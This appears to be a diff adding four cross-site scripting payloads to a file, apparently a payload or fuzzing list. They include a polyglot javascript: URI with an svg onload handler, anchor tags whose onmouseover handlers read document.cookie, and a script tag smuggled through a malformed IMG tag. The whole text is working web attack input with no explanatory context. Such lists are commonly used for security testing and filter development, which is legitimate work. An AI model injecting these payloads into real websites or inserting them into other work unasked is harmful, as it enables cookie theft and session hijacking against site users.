@@ -1,0 +1,4 @@
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
